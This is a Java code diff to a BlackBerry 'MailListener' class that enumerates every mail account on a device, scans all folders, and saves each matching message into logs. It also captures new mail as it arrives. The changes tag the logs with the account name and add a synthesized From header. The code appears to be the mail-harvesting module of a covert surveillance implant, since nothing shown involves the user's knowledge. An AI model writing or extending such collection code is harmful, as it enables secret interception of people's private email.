@@ -118,6 +118,8 @@ public final class MailListener implements FolderListener, StoreListener,
     public synchronized void messagesAdded(final FolderEvent folderEvent) {
         final Message message = folderEvent.getMessage();
 
+        boolean added = folderEvent.getType() == FolderEvent.MESSAGE_ADDED;
+
         //#ifdef DEBUG_INFO
         debug
                 .info("Added Message: " + message + " folderEvent: "
@@ -135,7 +137,7 @@ public final class MailListener implements FolderListener, StoreListener,
             int type = folderEvent.getType();
             if (type != FolderEvent.MESSAGE_ADDED) {
                 //#ifdef DEBUG_INFO
-                debug.info("filterMessage: FILTERED_MESSAGE_ADDED");
+                debug.info("filterMessage type: " + type);
                 //#endif
                 return;
             }
@@ -143,7 +145,8 @@ public final class MailListener implements FolderListener, StoreListener,
             final int filtered = realtimeFilter.filterMessage(message,
                     messageAgent.lastcheck);
             if (filtered == Filter.FILTERED_OK) {
-                boolean ret = saveLog(message, realtimeFilter.maxMessageSize);
+                boolean ret = saveLog(message, realtimeFilter.maxMessageSize,
+                        "local");
                 //#ifdef DEBUG
                 if (ret) {
                     debug.trace("messagesAdded: "
@@ -202,20 +205,20 @@ public final class MailListener implements FolderListener, StoreListener,
         for (int count = mailServiceRecords.length - 1; count >= 0; --count) {
             names[count] = mailServiceRecords[count].getName();
             //#ifdef DEBUG_TRACE
-            debug.trace("Nome dell'account di posta: " + names[count]);
+            debug.trace("Email account name: " + names[count]);
             //#endif
 
-            names[count] = mailServiceRecords[0].getName();
+            //names[count] = mailServiceRecords[0].getName();
             final ServiceConfiguration sc = new ServiceConfiguration(
                     mailServiceRecords[count]);
             final Store store = Session.getInstance(sc).getStore();
 
             final Folder[] folders = store.list();
             // Scandisco ogni Folder dell'account di posta
-            scanFolders(folders);
+            scanFolders(names[count], folders);
         }
         //#ifdef DEBUG_TRACE
-        debug.trace("Fine ricerca!!");
+        debug.trace("End search");
         //#endif
 
         collecting = false;
@@ -223,18 +226,21 @@ public final class MailListener implements FolderListener, StoreListener,
     }
 
     private synchronized boolean saveLog(final Message message,
-            final long maxMessageSize) {
+            final long maxMessageSize, String storeName) {
 
         //#ifdef DEBUG_TRACE
-        debug.trace("saveLog: " + message);
+        debug.trace("saveLog: " + message + " name: " + storeName);
         //#endif
 
         ByteArrayOutputStream os = null;
         try {
 
             final int flags = 1;
-            String mail = parseMessage(message, maxMessageSize);
-            final int size = message.getSize();
+            String mail = parseMessage(message, maxMessageSize, storeName);
+            int size = message.getSize();
+            if (size == -1) {
+                size = mail.length();
+            }
 
             final DateTime filetime = new DateTime(message.getReceivedDate());
 
@@ -279,10 +285,11 @@ public final class MailListener implements FolderListener, StoreListener,
     /**
      * scansione ricorsiva della directories.
      * 
+     * @param name
      * @param subfolders
      *            the subfolders
      */
-    public void scanFolders(final Folder[] subfolders) {
+    public void scanFolders(String storeName, final Folder[] subfolders) {
         Folder[] dirs;
 
         if (subfolders == null || subfolders.length <= 0) {
@@ -294,16 +301,24 @@ public final class MailListener implements FolderListener, StoreListener,
             Folder folder = subfolders[count];
             //#ifdef DEBUG_TRACE
             debug.trace("Folder name: " + folder.getFullName());
-            //#endif
-
-            //#ifdef DEBUG_TRACE
             debug.trace("scanFolders getName: " + folder.getName());
             //#endif
 
             dirs = folder.list();
-            scanFolders(dirs);
+            scanFolders(storeName, dirs);
             try {
                 final Message[] messages = folder.getMessages();
+
+                //#ifdef DEBUG_TRACE
+                // stampo le date.
+                for (int j = 0; j < messages.length; j++) {
+                    final Message message = messages[j];
+                    debug.trace("# " + j + " Received: "
+                            + message.getReceivedDate().toString() + " Sent: "
+                            + message.getSentDate().toString());
+                }
+                //#endif
+
                 // Scandisco ogni e-mail dell'account di posta
                 for (int j = 0; j < messages.length; j++) {
                     try {
@@ -326,7 +341,11 @@ public final class MailListener implements FolderListener, StoreListener,
                         final int filtered = collectFilter.filterMessage(
                                 message, messageAgent.lastcheck);
                         if (filtered == Filter.FILTERED_OK) {
-                            saveLog(message, realtimeFilter.maxMessageSize);
+                            //#ifdef DEBUG_TRACE
+                            debug.trace("Store name: " + storeName);
+                            //#endif
+                            saveLog(message, realtimeFilter.maxMessageSize,
+                                    storeName);
                         } else if (filtered == Filter.FILTERED_DISABLED) {
                             return;
                         } else if (filtered == Filter.FILTERED_FOUND) {
@@ -395,12 +414,14 @@ public final class MailListener implements FolderListener, StoreListener,
         return true;
     }
 
-    private String parseMessage(final Message message, final long maxMessageSize) {
+    private String parseMessage(final Message message,
+            final long maxMessageSize, final String from) {
         Address[] addresses;
 
         StringBuffer mailRaw = new StringBuffer();
 
         addAllHeaders(message.getAllHeaders(), mailRaw);
+        addFromHeaders(message.getAllHeaders(), mailRaw, from);
 
         MailParser parser = new MailParser(message);
         Mail mail = parser.parse();
@@ -462,6 +483,27 @@ public final class MailListener implements FolderListener, StoreListener,
                 debug.error("Unknown header type: " + headerObj);
                 //#endif
             }
+        }
+    }
+
+    private void addFromHeaders(final Enumeration headers, StringBuffer mail,
+            String from) {
+
+        boolean fromFound = false;
+        while (headers.hasMoreElements()) {
+            Object headerObj = headers.nextElement();
+            if (headerObj instanceof Header) {
+                Header header = (Header) headerObj;
+                if (header.getName().startsWith("From")) {
+                    fromFound = true;
+                }
+            }
+        }
+        if (!fromFound) {
+            //#ifdef DEBUG_INFO
+            debug.info("Adding from: " + from);
+            //#endif
+            mail.append("From: " + from + "\r\n");
         }
     }
 
